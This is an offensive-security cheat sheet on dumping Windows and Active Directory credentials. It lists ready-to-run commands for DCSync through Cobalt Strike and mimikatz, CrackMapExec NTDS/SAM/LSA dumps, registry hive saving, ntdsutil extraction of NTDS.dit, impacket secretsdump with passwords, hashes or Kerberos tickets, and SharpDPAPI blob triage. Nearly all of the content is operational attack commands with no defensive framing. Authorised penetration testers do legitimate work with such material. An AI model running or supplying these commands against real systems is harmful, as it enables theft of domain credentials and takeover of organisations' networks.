# Methods of Credential Dumping

## DCSync

### Cobalt Strike

Cobalt Strike offers the “dcsync” command which is a wrapper for mimikatz.

If you have domain admin trust established with the domain controller, this will replicate all user's NTLM hashes. The command  `dcsync` is a shortcut for `mimikatz @lsadump::dcsync /domain:<domain.fqdn /all /csv`

```
dcsyn <domain.fqdn>
```

### CrackMapExec

Supports dumping NTDS via VSS or DRSUAPI. Specifying the method is optional.

```
crackmapexec smb <target> -u admin -p Password123 -d domain --ntds <drsuapi|vss>
```

### Manual DCSync using vssadmin

```
reg save hklm\sam SAM
```
```
reg save hklm\system SYSTEM
```
```
reg save hklm\security SECURITY
```

### Manual NTDS.dit Extraction using ntdsutil

```
ntdsutil "ac in ntds" i "cr fu c:\temp" q q
```

After doing one of the two manual methods, convert to a readable format with impacket on your local system.

```
impacket-secretsdump -sam /root/SAM -security /root/SECURITY -system /root/SYSTEM LOCAL
```

## Local SAM and LSA

### Cobalt Strike

Use the built-in `hashdump` command to dump local SAM hashes.

### Impacket

Use secretsdump.py to extract credentials remotely. You can do this using a password, NTLM Hash, or with a Kerberos ticket. Also supports extracting credentials from local files.

Extract with NTLM hash:
```
secretsdump.py -hashes :6d9dc9bd065d9f9a628b0f1a0c54c976 domain\username@target
```

Extract with password: 
```
secretsdump.py domain\username:password@target
```

Extract with Kerberos Ticket: 
```
secretsdump.py domain\username@target -k -no-pass
```

> To extract with Kerberos ticket first request a TGT with asktgt.py then apply the TGS ticket with export KRB5CCNAME=<TGS_ccache_file>
{.is-info}


### CrackMapExec

Extract hashes from SAM using plaintext password(-p flag):

```
crackmapexec smb <target> -u admin -p Password123 -d domain --sam
```

Extract hashes from LSA using NTLM hash (-H flag):

```
crackmapexec smb <target> -u admin -H <NTLM_HASH> -d domain --lsa
```

### SeatBelt

Extract hashes from Security Auth Packages. By default this is usually just NTLMv2.

```
Seatbelt.exe SecPackageCreds
```

### Manual Method

From the compromised machines, navigate to C:\Windows\System32\Config. This is where the SAM, SYSTEM, and Security hives are located. You cant create a copy using copy because there’s a write block on the files. Save to another location using reg save:

```
reg save hklm\sam SAM
```
```
reg save hklm\system SYSTEM
```
```
reg save hklm\security SECURITY
```

Copy over the files, SAM, SYSTEM, and SECURITY, which should now be in the current working directory to your local system and use impacket to convert them into a readable format with the command:`impacket-secretsdump -sam /root/SAM -security /root/SECURITY -system /root/SYSTEM LOCAL`

## DPAPI

### User/Machine Triaging

List all user credentials, vault, and RDG DPAPI blobs using a password. Can also be run without a password if the beacon is running under the user's context.

`SharpDPAPI.exe triage /password:X`

List all system credentials and vault DPAPI blobs. You need admin rights to execute this. This requires the system master keys that can only be retrieved by the SYSTEM user and cannot be performed remotely.

`SharpDPAPI.exe machinetriage`

### Domain Backup Key

List user credentials, vaults, and RDG blobs on a remote system using a domain backup key.

`SharpDPAPI.exe triage /pvk:[key_file | b64(key)] /server:X.domain.com`
